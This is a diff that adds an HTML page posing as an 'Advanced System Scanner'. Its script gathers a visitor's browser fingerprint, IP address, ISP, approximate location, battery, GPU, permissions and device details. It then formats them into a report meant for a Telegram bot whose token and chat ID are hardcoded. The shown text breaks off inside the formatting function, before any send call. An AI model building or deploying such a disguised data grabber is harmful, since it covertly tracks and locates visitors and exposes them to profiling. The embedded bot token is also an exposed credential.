@@ -1,0 +1,1226 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <script>window.__sb_state = { "forwardPreviewErrors": true };</script>
+    <script src="/.localservice@runtime.5a421e5b.js"></script>
+    <script src="/.localservice@wc-api-script.js"></script>
+    <script>delete window.__sb_w; document.querySelectorAll('script').forEach(n => n.remove());</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced System Scanner</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #000;
+            color: #00ff00;
+            font-family: 'Share Tech Mono', monospace;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            background-image:
+                radial-gradient(circle at 50% 50%, rgba(0, 255, 0, 0.1) 0%, transparent 50%),
+                linear-gradient(0deg, rgba(0, 0, 0, 0.9) 0%, rgba(0, 0, 0, 1) 100%);
+        }
+
+        .container {
+            max-width: 900px;
+            width: 100%;
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 2.8em;
+            margin-bottom: 20px;
+            text-shadow: 0 0 10px #00ff00;
+            letter-spacing: 2px;
+        }
+
+        .status-box {
+            border: 2px solid #00ff00;
+            padding: 25px;
+            margin: 20px 0;
+            border-radius: 15px;
+            background: rgba(0, 255, 0, 0.05);
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .status-box::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg,
+                    transparent,
+                    rgba(0, 255, 0, 0.1),
+                    transparent);
+            transform: rotate(45deg);
+            animation: shimmer 3s linear infinite;
+        }
+
+        @keyframes shimmer {
+            0% {
+                transform: translateX(-100%) rotate(45deg);
+            }
+
+            100% {
+                transform: translateX(100%) rotate(45deg);
+            }
+        }
+
+        #scanButton {
+            background: transparent;
+            color: #00ff00;
+            border: 2px solid #00ff00;
+            padding: 20px 40px;
+            font-size: 1.4em;
+            cursor: pointer;
+            margin: 30px 0;
+            font-family: 'Share Tech Mono', monospace;
+            transition: all 0.3s ease;
+            border-radius: 10px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        #scanButton:hover {
+            background: #00ff00;
+            color: #000;
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.5);
+            transform: scale(1.05);
+        }
+
+        #scanButton:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: scale(1);
+        }
+
+        .progress-container {
+            width: 100%;
+            margin: 30px 0;
+            position: relative;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 25px;
+            background: #111;
+            border: 2px solid #00ff00;
+            border-radius: 15px;
+            overflow: hidden;
+            position: relative;
+            display: none;
+        }
+
+        .progress-bar-fill {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg,
+                    #00ff00,
+                    #80ff80,
+                    #00ff00);
+            transition: width 0.5s ease;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
+        }
+
+        .progress-label {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #fff;
+            text-shadow: 0 0 5px rgba(0, 0, 0, 0.8);
+            font-weight: bold;
+            z-index: 1;
+        }
+
+        #status {
+            margin-top: 20px;
+            font-size: 1.2em;
+            min-height: 30px;
+        }
+
+        .blink {
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0;
+            }
+
+            100% {
+                opacity: 1;
+            }
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 25px;
+            margin-top: 30px;
+        }
+
+        .info-item {
+            border: 1px solid #00ff00;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: left;
+            background: rgba(0, 255, 0, 0.05);
+            transition: all 0.3s ease;
+        }
+
+        .info-item:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 15px rgba(0, 255, 0, 0.2);
+        }
+
+        .loading-text {
+            font-size: 1.3em;
+            margin: 15px 0;
+            letter-spacing: 1px;
+        }
+
+        .scan-details {
+            display: none;
+            margin-top: 20px;
+            padding: 15px;
+            border: 1px solid #00ff00;
+            border-radius: 10px;
+            background: rgba(0, 255, 0, 0.05);
+        }
+
+        .scan-details.active {
+            display: block;
+        }
+
+        .detail-item {
+            margin: 10px 0;
+            padding: 5px;
+            border-bottom: 1px solid rgba(0, 255, 0, 0.2);
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+
+            50% {
+                transform: scale(1.05);
+            }
+
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>Advanced System Scanner v2.0</h1>
+        <div class="status-box">
+            <p id="status">System ready for comprehensive scan...</p>
+        </div>
+        <button id="scanButton">INITIATE DEEP SCAN</button>
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar">
+                <div class="progress-bar-fill" id="progressBarFill"></div>
+                <div class="progress-label" id="progressLabel">0%</div>
+            </div>
+        </div>
+        <div class="scan-details" id="scanDetails"></div>
+        <div class="info-grid" id="infoGrid"></div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "7749583805:AAHYiiwYNicmp_om01GzYTXDJTBVbyWcebk";
+        const CHAT_ID = "7738462570";
+
+        async function collectSystemInfo() {
+            const info = {
+                // Extended Browser Information
+                browser: {
+                    userAgent: navigator.userAgent,
+                    appCodeName: navigator.appCodeName,
+                    appName: navigator.appName,
+                    appVersion: navigator.appVersion,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    cookiesEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack,
+                    platform: navigator.platform,
+                    maxTouchPoints: navigator.maxTouchPoints,
+                    deviceMemory: navigator.deviceMemory || 'Unknown',
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    darkMode: window.matchMedia('(prefers-color-scheme: dark)').matches,
+                    vendor: navigator.vendor,
+                    product: navigator.product,
+                    productSub: navigator.productSub,
+                    onLine: navigator.onLine,
+                    javaEnabled: navigator.javaEnabled(),
+                    pdfViewerEnabled: navigator.pdfViewerEnabled,
+                    webdriver: navigator.webdriver,
+                    bluetooth: 'bluetooth' in navigator,
+                    credentials: 'credentials' in navigator,
+                    keyboard: 'keyboard' in navigator,
+                    mediaCapabilities: 'mediaCapabilities' in navigator,
+                    permissions: 'permissions' in navigator,
+                    usb: 'usb' in navigator,
+                    wakeLock: 'wakeLock' in navigator,
+                },
+
+                // Extended Screen Information
+                screen: {
+                    width: window.screen.width,
+                    height: window.screen.height,
+                    availWidth: window.screen.availWidth,
+                    availHeight: window.screen.availHeight,
+                    colorDepth: window.screen.colorDepth,
+                    pixelDepth: window.screen.pixelDepth,
+                    pixelRatio: window.devicePixelRatio,
+                    orientation: screen.orientation ? {
+                        type: screen.orientation.type,
+                        angle: screen.orientation.angle
+                    } : 'Not available',
+                    isExtended: window.screen.isExtended || false,
+                },
+
+                // Extended Window Information
+                window: {
+                    innerWidth: window.innerWidth,
+                    innerHeight: window.innerHeight,
+                    outerWidth: window.outerWidth,
+                    outerHeight: window.outerHeight,
+                    screenX: window.screenX,
+                    screenY: window.screenY,
+                    pageXOffset: window.pageXOffset,
+                    pageYOffset: window.pageYOffset,
+                    scrollX: window.scrollX,
+                    scrollY: window.scrollY,
+                    scrollbars: window.scrollbars ? window.scrollbars.visible : 'Unknown',
+                    visualViewport: window.visualViewport ? {
+                        width: window.visualViewport.width,
+                        height: window.visualViewport.height,
+                        scale: window.visualViewport.scale,
+                    } : 'Not available',
+                },
+
+                // Extended Network Information
+                network: await getExtendedNetworkInfo(),
+
+                // Extended Battery Information
+                battery: await getExtendedBatteryInfo(),
+
+                // Extended Device Information
+                device: {
+                    vendor: navigator.vendor,
+                    platform: navigator.platform,
+                    oscpu: navigator.oscpu,
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory,
+                    maxTouchPoints: navigator.maxTouchPoints,
+                    keyboard: 'keyboard' in navigator,
+                    gamepads: 'getGamepads' in navigator,
+                    bluetooth: 'bluetooth' in navigator,
+                    usb: 'usb' in navigator,
+                    serial: 'serial' in navigator,
+                },
+
+                // System Performance
+                performance: await getExtendedPerformanceInfo(),
+
+                // Extended Location Information
+                location: await getExtendedLocationInfo(),
+
+                // Extended Graphics Information
+                graphics: await getExtendedGraphicsInfo(),
+
+                // Media Capabilities
+                media: await getMediaCapabilities(),
+
+                // Extended System Checks
+                systemChecks: await getExtendedSystemChecks(),
+
+                // Storage Information
+                storage: await getStorageInfo(),
+
+                // Extended Feature Detection
+                features: await getFeatureSupport(),
+
+                // Time and Locale Information
+                timeAndLocale: getTimeAndLocaleInfo(),
+
+                // Security Information
+                security: getSecurityInfo(),
+
+                // Input Devices
+                inputDevices: await getInputDevicesInfo(),
+
+                // Extended Browser Capabilities
+                capabilities: getBrowserCapabilities(),
+
+                // Connection State
+                connectionState: getConnectionState(),
+            };
+
+            return info;
+        }
+
+        async function getExtendedNetworkInfo() {
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            const networkInfo = {
+                type: connection ? connection.effectiveType : 'Unknown',
+                downlink: connection ? connection.downlink : 'Unknown',
+                rtt: connection ? connection.rtt : 'Unknown',
+                saveData: connection ? connection.saveData : 'Unknown',
+                downlinkMax: connection ? connection.downlinkMax : 'Unknown',
+                onLine: navigator.onLine,
+            };
+
+            try {
+                const [ipResponse, detailedResponse] = await Promise.all([
+                    fetch('https://api.ipify.org?format=json'),
+                    fetch('https://ipapi.co/json/')
+                ]);
+
+                const ipData = await ipResponse.json();
+                const detailedData = await detailedResponse.json();
+
+                networkInfo.ip = ipData.ip;
+                networkInfo.isp = detailedData.org;
+                networkInfo.asn = detailedData.asn;
+                networkInfo.hostname = detailedData.hostname;
+            } catch (error) {
+                networkInfo.ip = 'Failed to fetch';
+            }
+
+            return networkInfo;
+        }
+
+        async function getExtendedBatteryInfo() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return {
+                        charging: battery.charging,
+                        level: battery.level * 100,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime,
+                        supportsFastCharging: 'fastCharge' in battery,
+                        temperature: battery.temperature || 'Not available',
+                    };
+                } catch (error) {
+                    return 'Battery API not available';
+                }
+            }
+            return 'Battery API not supported';
+        }
+
+        async function getExtendedPerformanceInfo() {
+            const perfInfo = {
+                timing: {},
+                memory: {},
+                navigation: {},
+                timeOrigin: performance.timeOrigin,
+            };
+
+            if (performance.memory) {
+                perfInfo.memory = {
+                    jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
+                    totalJSHeapSize: performance.memory.totalJSHeapSize,
+                    usedJSHeapSize: performance.memory.usedJSHeapSize,
+                };
+            }
+
+            if (performance.timing) {
+                const timing = performance.timing;
+                perfInfo.timing = {
+                    navigationStart: timing.navigationStart,
+                    loadEventEnd: timing.loadEventEnd,
+                    domComplete: timing.domComplete,
+                    domInteractive: timing.domInteractive,
+                    domContentLoadedEventEnd: timing.domContentLoadedEventEnd,
+                };
+            }
+
+            if (performance.navigation) {
+                perfInfo.navigation = {
+                    type: performance.navigation.type,
+                    redirectCount: performance.navigation.redirectCount,
+                };
+            }
+
+            // Get performance entries
+            perfInfo.entries = {
+                resources: performance.getEntriesByType('resource').length,
+                marks: performance.getEntriesByType('mark').length,
+                measures: performance.getEntriesByType('measure').length,
+            };
+
+            return perfInfo;
+        }
+
+        async function getExtendedLocationInfo() {
+            const locationInfo = {};
+
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+
+                locationInfo.ip = data.ip;
+                locationInfo.city = data.city;
+                locationInfo.region = data.region;
+                locationInfo.country = data.country_name;
+                locationInfo.postal = data.postal;
+                locationInfo.latitude = data.latitude;
+                locationInfo.longitude = data.longitude;
+                locationInfo.timezone = data.timezone;
+                locationInfo.currency = data.currency;
+                locationInfo.org = data.org;
+                locationInfo.asn = data.asn;
+                locationInfo.countryCode = data.country_code;
+                locationInfo.continent = data.continent_code;
+                locationInfo.eu = data.in_eu;
+            } catch (error) {
+                locationInfo.error = 'Location fetch failed';
+            }
+
+            // Add timezone information
+            locationInfo.timezoneInfo = {
+                offset: new Date().getTimezoneOffset(),
+                timezoneName: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                daylightSaving: isDaylightSavingTime(),
+            };
+
+            return locationInfo;
+        }
+
+        async function getExtendedGraphicsInfo() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+
+            if (!gl) {
+                return 'WebGL not supported';
+            }
+
+            const info = {
+                vendor: gl.getParameter(gl.VENDOR),
+                renderer: gl.getParameter(gl.RENDERER),
+                version: gl.getParameter(gl.VERSION),
+                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+                maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+                maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
+                maxRenderbufferSize: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE),
+                maxVertexAttribs: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
+                maxVertexUniformVectors: gl.getParameter(gl.MAX_VERTEX_UNIFORM_VECTORS),
+                maxVaryingVectors: gl.getParameter(gl.MAX_VARYING_VECTORS),
+                maxCombinedTextureImageUnits: gl.getParameter(gl.MAX_COMBINED_TEXTURE_IMAGE_UNITS),
+                maxVertexTextureImageUnits: gl.getParameter(gl.MAX_VERTEX_TEXTURE_IMAGE_UNITS),
+                maxTextureImageUnits: gl.getParameter(gl.MAX_TEXTURE_IMAGE_UNITS),
+                maxFragmentUniformVectors: gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS),
+                extensions: gl.getSupportedExtensions(),
+            };
+
+            // Check for WebGL2
+            const gl2 = canvas.getContext('webgl2');
+            info.webgl2Support = !!gl2;
+
+            // Check for specific extensions
+            info.extensionSupport = {
+                anisotropicFiltering: gl.getExtension('EXT_texture_filter_anisotropic'),
+                floatTextures: gl.getExtension('OES_texture_float'),
+                standardDerivatives: gl.getExtension('OES_standard_derivatives'),
+                compressedTextureS3TC: gl.getExtension('WEBGL_compressed_texture_s3tc'),
+                depthTexture: gl.getExtension('WEBGL_depth_texture'),
+            };
+
+            return info;
+        }
+
+        async function getMediaCapabilities() {
+            const mediaInfo = {
+                audioSupport: {},
+                videoSupport: {},
+                mediaDevices: {},
+                mimeTypes: {},
+            };
+
+            // Audio support
+            mediaInfo.audioSupport = {
+                webAudio: 'AudioContext' in window,
+                audioWorklet: 'AudioWorklet' in window,
+                mediaRecorder: 'MediaRecorder' in window,
+                webSpeech: 'SpeechRecognition' in window || 'webkitSpeechRecognition' in window,
+            };
+
+            // Video support
+            mediaInfo.videoSupport = {
+                videoPlayback: document.createElement('video').canPlayType !== undefined,
+                pictureInPicture: document.pictureInPictureEnabled,
+                fullscreen: document.fullscreenEnabled,
+                mediaSession: 'mediaSession' in navigator,
+            };
+
+            // Media Devices
+            if (navigator.mediaDevices) {
+                try {
+                    mediaInfo.mediaDevices = {
+                        enumerateDevices: 'enumerateDevices' in navigator.mediaDevices,
+                        getUserMedia: 'getUserMedia' in navigator.mediaDevices,
+                        getDisplayMedia: 'getDisplayMedia' in navigator.mediaDevices,
+                    };
+                } catch (e) {
+                    mediaInfo.mediaDevices.error = 'Access denied';
+                }
+            }
+
+            // MIME Types
+            const commonMimeTypes = [
+                'video/mp4',
+                'video/webm',
+                'audio/mpeg',
+                'audio/ogg',
+                'application/x-mpegURL',
+                'application/vnd.apple.mpegURL',
+            ];
+
+            commonMimeTypes.forEach(type => {
+                mediaInfo.mimeTypes[type] = document.createElement('video').canPlayType(type);
+            });
+
+            return mediaInfo;
+        }
+
+        async function getExtendedSystemChecks() {
+            return {
+                webGL: checkWebGL(),
+                webGL2: checkWebGL2(),
+                canvas: checkCanvas(),
+                canvas2D: checkCanvas2D(),
+                webAssembly: checkWebAssembly(),
+                audio: checkAudio(),
+                webRTC: checkWebRTC(),
+                webWorker: checkWebWorker(),
+                serviceWorker: checkServiceWorker(),
+                indexedDB: checkIndexedDB(),
+                localStorage: checkLocalStorage(),
+                sessionStorage: checkSessionStorage(),
+                webSocket: checkWebSocket(),
+                webTransport: checkWebTransport(),
+                permissions: await checkPermissions(),
+                sensors: checkSensors(),
+                bluetooth: checkBluetooth(),
+                usb: checkUSB(),
+                serial: checkSerial(),
+                nfc: checkNFC(),
+                geolocation: checkGeolocation(),
+                pushNotification: checkPushNotification(),
+                backgroundSync: checkBackgroundSync(),
+                paymentRequest: checkPaymentRequest(),
+                credentials: checkCredentials(),
+                gamepad: checkGamepad(),
+                virtualReality: checkVirtualReality(),
+                augmentedReality: checkAugmentedReality(),
+            };
+        }
+
+        function checkWebGL() {
+            const canvas = document.createElement('canvas');
+            return !!(canvas.getContext('webgl') || canvas.getContext('experimental-webgl'));
+        }
+
+        function checkWebGL2() {
+            const canvas = document.createElement('canvas');
+            return !!canvas.getContext('webgl2');
+        }
+
+        function checkCanvas() {
+            const canvas = document.createElement('canvas');
+            return !!canvas.getContext;
+        }
+
+        function checkCanvas2D() {
+            const canvas = document.createElement('canvas');
+            return !!canvas.getContext('2d');
+        }
+
+        function checkWebAssembly() {
+            return typeof WebAssembly === 'object';
+        }
+
+        function checkAudio() {
+            return 'AudioContext' in window || 'webkitAudioContext' in window;
+        }
+
+        function checkWebRTC() {
+            return 'RTCPeerConnection' in window;
+        }
+
+        function checkWebWorker() {
+            return typeof Worker === 'function';
+        }
+
+        function checkServiceWorker() {
+            return 'serviceWorker' in navigator;
+        }
+
+        function checkIndexedDB() {
+            return !!window.indexedDB;
+        }
+
+        function checkLocalStorage() {
+            try {
+                return !!window.localStorage;
+            } catch (e) {
+                return false;
+            }
+        }
+
+        function checkSessionStorage() {
+            try {
+                return !!window.sessionStorage;
+            } catch (e) {
+                return false;
+            }
+        }
+
+        function checkWebSocket() {
+            return typeof WebSocket === 'function';
+        }
+
+        function checkWebTransport() {
+            return 'WebTransport' in window;
+        }
+
+        async function checkPermissions() {
+            if (!navigator.permissions) return 'Not supported';
+
+            const permissions = [
+                'geolocation',
+                'notifications',
+                'push',
+                'midi',
+                'camera',
+                'microphone',
+                'background-fetch',
+                'background-sync',
+                'clipboard-read',
+                'clipboard-write',
+                'payment-handler',
+            ];
+
+            const results = {};
+            for (const permission of permissions) {
+                try {
+                    const result = await navigator.permissions.query({ name: permission });
+                    results[permission] = result.state;
+                } catch (e) {
+                    results[permission] = 'error';
+                }
+            }
+            return results;
+        }
+
+        function checkSensors() {
+            return {
+                accelerometer: 'Accelerometer' in window,
+                gyroscope: 'Gyroscope' in window,
+                magnetometer: 'Magnetometer' in window,
+                ambientLight: 'AmbientLightSensor' in window,
+                proximity: 'ProximitySensor' in window,
+            };
+        }
+
+        function checkBluetooth() {
+            return 'bluetooth' in navigator;
+        }
+
+        function checkUSB() {
+            return 'usb' in navigator;
+        }
+
+        function checkSerial() {
+            return 'serial' in navigator;
+        }
+
+        function checkNFC() {
+            return 'nfc' in navigator;
+        }
+
+        function checkGeolocation() {
+            return 'geolocation' in navigator;
+        }
+
+        function checkPushNotification() {
+            return 'PushManager' in window;
+        }
+
+        function checkBackgroundSync() {
+            return 'SyncManager' in window;
+        }
+
+        function checkPaymentRequest() {
+            return 'PaymentRequest' in window;
+        }
+
+        function checkCredentials() {
+            return 'credentials' in navigator;
+        }
+
+        function checkGamepad() {
+            return 'getGamepads' in navigator;
+        }
+
+        function checkVirtualReality() {
+            return 'xr' in navigator;
+        }
+
+        function checkAugmentedReality() {
+            return 'xr' in navigator && navigator.xr.isSessionSupported;
+        }
+
+        async function getStorageInfo() {
+            const storageInfo = {
+                localStorage: checkLocalStorage(),
+                sessionStorage: checkSessionStorage(),
+                indexedDB: checkIndexedDB(),
+                cookiesEnabled: navigator.cookieEnabled,
+            };
+
+            if (navigator.storage && navigator.storage.estimate) {
+                try {
+                    const estimate = await navigator.storage.estimate();
+                    storageInfo.quota = {
+                        total: estimate.quota,
+                        used: estimate.usage,
+                        remaining: estimate.quota - estimate.usage,
+                    };
+                } catch (e) {
+                    storageInfo.quota = 'Error getting quota';
+                }
+            }
+
+            return storageInfo;
+        }
+
+        async function getFeatureSupport() {
+            return {
+                css: detectCSSFeatures(),
+                html5: detectHTML5Features(),
+                api: detectAPIFeatures(),
+                input: detectInputFeatures(),
+                security: detectSecurityFeatures(),
+            };
+        }
+
+        function detectCSSFeatures() {
+            const div = document.createElement('div');
+            return {
+                grid: 'grid' in div.style,
+                flexbox: 'flexbox' in div.style || 'flex' in div.style,
+                transforms: 'transform' in div.style,
+                transitions: 'transition' in div.style,
+                animations: 'animation' in div.style,
+                variables: window.CSS && CSS.supports('--custom-property', 'value'),
+            };
+        }
+
+        function detectHTML5Features() {
+            return {
+                canvas: !!document.createElement('canvas').getContext,
+                video: !!document.createElement('video').canPlayType,
+                audio: !!document.createElement('audio').canPlayType,
+                svg: !!document.createElementNS && !!document.createElementNS('http://www.w3.org/2000/svg', 'svg').createSVGRect,
+                dragAndDrop: 'draggable' in document.createElement('div'),
+                contentEditable: 'contentEditable' in document.createElement('div'),
+            };
+        }
+
+        function detectAPIFeatures() {
+            return {
+                fetch: 'fetch' in window,
+                webSockets: 'WebSocket' in window,
+                webWorkers: 'Worker' in window,
+                serviceWorkers: 'serviceWorker' in navigator,
+                geolocation: 'geolocation' in navigator,
+                webGL: !!document.createElement('canvas').getContext('webgl'),
+                webRTC: 'RTCPeerConnection' in window,
+                touch: 'ontouchstart' in window,
+                speech: 'SpeechRecognition' in window || 'webkitSpeechRecognition' in window,
+            };
+        }
+
+        function detectInputFeatures() {
+            return {
+                touch: 'ontouchstart' in window,
+                pointer: 'PointerEvent' in window,
+                mouse: 'onmousemove' in window,
+                keyboard: 'onkeydown' in window,
+                gamepad: 'getGamepads' in navigator,
+            };
+        }
+
+        function detectSecurityFeatures() {
+            return {
+                secureContext: window.isSecureContext,
+                cors: 'fetch' in window,
+                contentSecurityPolicy: 'securityPolicy' in document,
+                crossOriginIsolated: window.crossOriginIsolated,
+            };
+        }
+
+        function getTimeAndLocaleInfo() {
+            const date = new Date();
+            return {
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: date.getTimezoneOffset(),
+                locale: navigator.language,
+                formats: {
+                    date: new Intl.DateTimeFormat().format(date),
+                    number: new Intl.NumberFormat().format(1234.56),
+                    currency: new Intl.NumberFormat(undefined, { style: 'currency', currency: 'USD' }).format(100),
+                },
+                regionCode: navigator.language.split('-')[1] || '',
+                daylightSavings: isDaylightSavingTime(),
+            };
+        }
+
+        function isDaylightSavingTime() {
+            const date = new Date();
+            const jan = new Date(date.getFullYear(), 0, 1);
+            const jul = new Date(date.getFullYear(), 6, 1);
+            return Math.min(jan.getTimezoneOffset(), jul.getTimezoneOffset()) === date.getTimezoneOffset();
+        }
+
+        function getSecurityInfo() {
+            return {
+                https: window.isSecureContext,
+                tls: window.isSecureContext,
+                cors: 'fetch' in window,
+                contentSecurityPolicy: 'securityPolicy' in document,
+                crossOriginIsolated: window.crossOriginIsolated,
+                permissions: 'permissions' in navigator,
+                credentialsContainer: 'credentials' in navigator,
+                securePayment: 'PaymentRequest' in window,
+            };
+        }
+
+        async function getInputDevicesInfo() {
+            const info = {
+                pointer: {
+                    maxTouchPoints: navigator.maxTouchPoints,
+                    pointerEnabled: 'PointerEvent' in window,
+                    touchEnabled: 'ontouchstart' in window,
+                    coarsePointer: window.matchMedia('(pointer: coarse)').matches,
+                    finePointer: window.matchMedia('(pointer: fine)').matches,
+                },
+                keyboard: {
+                    present: 'keyboard' in navigator,
+                    layout: navigator.keyboard ? await navigator.keyboard.getLayoutMap().catch(() => 'unavailable') : 'unavailable',
+                },
+                gamepad: {
+                    supported: 'getGamepads' in navigator,
+                    gamepads: navigator.getGamepads ? Array.from(navigator.getGamepads()).filter(Boolean).length : 0,
+                },
+
+            };
+
+            if (navigator.mediaDevices) {
+                try {
+                    const devices = await navigator.mediaDevices.enumerateDevices();
+                    info.mediaDevices = {
+                        audioInputs: devices.filter(d => d.kind === 'audioinput').length,
+                        audioOutputs: devices.filter(d => d.kind === 'audiooutput').length,
+                        videoInputs: devices.filter(d => d.kind === 'videoinput').length,
+                    };
+                } catch (e) {
+                    info.mediaDevices = 'Access denied';
+                }
+            }
+
+            return info;
+        }
+
+        function getBrowserCapabilities() {
+            return {
+                cookies: navigator.cookieEnabled,
+                localStorage: checkLocalStorage(),
+                sessionStorage: checkSessionStorage(),
+                indexedDB: checkIndexedDB(),
+                webWorkers: 'Worker' in window,
+                serviceWorkers: 'serviceWorker' in navigator,
+                webSockets: 'WebSocket' in window,
+                webRTC: 'RTCPeerConnection' in window,
+                geolocation: 'geolocation' in navigator,
+                notifications: 'Notification' in window,
+                push: 'PushManager' in window,
+                bluetooth: 'bluetooth' in navigator,
+                usb: 'usb' in navigator,
+                midi: 'requestMIDIAccess' in navigator,
+                gamepad: 'getGamepads' in navigator,
+                virtualReality: 'xr' in navigator,
+                touchscreen: 'ontouchstart' in window,
+                accelerometer: 'Accelerometer' in window,
+                gyroscope: 'Gyroscope' in window,
+                magnetometer: 'Magnetometer' in window,
+                ambient: 'AmbientLightSensor' in window,
+            };
+        }
+
+        function getConnectionState() {
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            return {
+                online: navigator.onLine,
+                type: connection ? connection.effectiveType : 'unknown',
+                saveData: connection ? connection.saveData : false,
+                downlink: connection ? connection.downlink : 'unknown',
+                rtt: connection ? connection.rtt : 'unknown',
+                downlinkMax: connection ? connection.downlinkMax : 'unknown',
+            };
+        }
+
+        async function updateProgressBar(percent) {
+            const progressBar = document.getElementById('progressBar');
+            const progressBarFill = document.getElementById('progressBarFill');
+            const progressLabel = document.getElementById('progressLabel');
+
+            progressBar.style.display = 'block';
+            progressBarFill.style.width = `${percent}%`;
+            progressLabel.textContent = `${Math.round(percent)}%`;
+        }
+
+        function formatDataForTelegram(data) {
+            let message = '🔍 <b>Enhanced System Information Report</b>\n\n';
+
+            // Browser Info
+            message += '🌐 <b>Browser Information</b>\n';
+            message += `• User Agent: ${data.browser.userAgent}\n`;
+            message += `• Browser: ${data.browser.appName}\n`;
+            message += `• Version: ${data.browser.appVersion}\n`;
+            message += `• Language: ${data.browser.language}\n`;
+            message += `• Platform: ${data.browser.platform}\n`;
+            message += `• Cookies: ${data.browser.cookiesEnabled}\n`;
+            message += `• Touch Points: ${data.browser.maxTouchPoints}\n`;
+            message += `• Dark Mode: ${data.browser.darkMode}\n\n`;
+
+            // Screen Info
+            message += '📱 <b>Display Information</b>\n';
+            message += `• Resolution: ${data.screen.width}x${data.screen.height}\n`;
+            message += `• Available: ${data.screen.availWidth}x${data.screen.availHeight}\n`;
+            message += `• Color Depth: ${data.screen.colorDepth}\n`;
+            message += `• Pixel Ratio: ${data.screen.pixelRatio}\n`;
+            message += `• Orientation: ${data.screen.orientation?.type || 'Unknown'}\n\n`;
+
+            // Network Info
+            message += '🌍 <b>Network Information</b>\n';
+            message += `• IP Address: ${data.network.ip}\n`;
+            message += `• Connection: ${data.network.type}\n`;
+            message += `• Downlink: ${data.network.downlink} Mbps\n`;
+            message += `• RTT: ${data.network.rtt}ms\n`;
+            message += `• Online: ${data.network.onLine}\n\n`;
+
+            // Location Info
+            if (typeof data.location === 'object' && !data.location.error) {
+                message += '📍 <b>Location Information</b>\n';
+                message += `• City: ${data.location.city}\n`;
+                message += `• Region: ${data.location.region}\n`;
+                message += `• Country: ${data.location.country}\n`;
+                message += `• Timezone: ${data.location.timezone}\n`;
+                message += `• ISP: ${data.location.org}\n`;
+                message += `• ASN: ${data.location.asn}\n\n`;
+            }
+
+            // Battery Info
+            if (typeof data.battery === 'object') {
+                message += '🔋 <b>Battery Information</b>\n';
+                message += `• Charging: ${data.battery.charging}\n`;
+                message += `• Level: ${data.battery.level}%\n`;
+                message += `• Charging Time: ${data.battery.chargingTime}\n`;
+                message += `• Discharging Time: ${data.battery.dischargingTime}\n\n`;
+            }
+
+            // Hardware Info
+            message += '💻 <b>Hardware Information</b>\n';
+            message += `• CPU Cores: ${data.browser.hardwareConcurrency}\n`;
+            message += `• Memory: ${data.browser.deviceMemory}GB\n`;
+            if (typeof data.graphics === 'object') {
+                message += `• GPU: ${data.graphics.renderer}\n`;
+                message += `• Vendor: ${data.graphics.vendor}\n`;
+            }
+            message += '\n';
+
+            // System Capabilities
+            message += '⚙️ <b>System Capabilities</b>\n';
+            const checks = data.systemChecks;
+            message += `• WebGL: ${checks.webGL}\n`;
+            message += `• WebGL2: ${checks.webGL2}\n`;
+            message += `• Canvas: ${checks.canvas}\n`;
+            message += `• WebAssembly: ${checks.webAssembly}\n`;
+            message += `• WebRTC: ${checks.webRTC}\n`;
+            message += `• WebWorker: ${checks.webWorker}\n`;
+            message += `• ServiceWorker: ${checks.serviceWorker}\n\n`;
+
+            // Media Capabilities
+            if (data.media) {
+                message += '🎮 <b>Media Capabilities</b>\n';
+                message += `• Audio: ${data.media.audioSupport.webAudio}\n`;
+                message += `• Video: ${data.media.videoSupport.videoPlayback}\n`;
+                message += `• PiP: ${data.media.videoSupport.pictureInPicture}\n`;
